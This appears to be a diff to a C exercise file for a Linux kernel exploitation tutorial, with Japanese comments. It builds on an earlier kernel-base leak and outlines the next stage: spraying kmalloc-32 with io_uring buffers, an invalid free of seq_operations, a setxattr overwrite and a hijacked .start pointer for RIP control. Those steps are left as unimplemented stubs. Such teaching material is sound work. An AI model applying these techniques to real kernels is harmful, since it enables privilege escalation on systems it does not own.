@@ -14,10 +14,16 @@
 #include <unistd.h>
 
 #define UNIMPLEMENTED() assert(0 && "unimplemented")
+#define UNIMPLEMENTED_(n) (n)
 #define errExit(msg)    \
   do {                  \
     perror(msg);        \
     exit(EXIT_FAILURE); \
+  } while (0)
+#define WAIT()            \
+  do {                    \
+    puts("[WAITING...]"); \
+    getchar();            \
   } while (0)
 #define ulong unsigned long
 #define PAGE 0x1000UL
@@ -153,6 +159,10 @@ int main(void) {
   struct msgmsg20 msg = {.mtype = 0x1};
   int fd = open_maps();
 
+  // setxattrで利用するようのダミーファイルを作成
+#define SETXATTR_FILE_NAME "/tmp/setxattrf"
+  system("echo setxattr > " SETXATTR_FILE_NAME);
+
   // ringの初期化
   init_uring(&ring);
 
@@ -195,6 +205,40 @@ int main(void) {
   const ulong kbase = init_ipc_ns - 0xEB0D60;
   printf("[!] init_ipc_ns: 0x%lx\n", init_ipc_ns);
   printf("[!] kbase: 0x%lx\n", kbase);
+
+  /**** ここまで`p6-kbase-leak.c`と同じなのでコピペしてください。 ********/
+
+  /**
+   * もう一度大量に`io_buffer`をkmalloc-32に確保する。
+   * NOTE: BGIDは先ほどと別のものを使う。
+   */
+  puts("[+] Spraying kmalloc-32 with `io_buffer` again...");
+  UNIMPLEMENTED();
+
+  /**
+   * `seq_operations`を`io_buffer`の直後に確保する。
+   */
+  puts("[+] Allocating seq_operations on io_buffer...");
+  UNIMPLEMENTED();
+
+  /**
+   * Invalid Freeを使って先程確保した`seq_operations`を解放する。
+   */
+  puts("[!] Invoking invalid free...");
+  UNIMPLEMENTED();
+
+  /**
+   * `setxattr`を使って先程解放した`seq_operations`に対して`0xDEADBEEFCAFEBABE`を書き込む。
+   */
+  puts("[!] Overwriting seq_operations using UAF...");
+  UNIMPLEMENTED();
+
+  /**
+   * `seq_operations`の`.start`関数ポインタを呼び出す。
+   * この関数ポインタは0xDEADBEEFCAFEBABEに書き換えられているため、このアドレスにRIPが飛ぶ。
+   */
+  puts("[!] Calling seq_operations.start...");
+  UNIMPLEMENTED();
 
   return 0;
 }
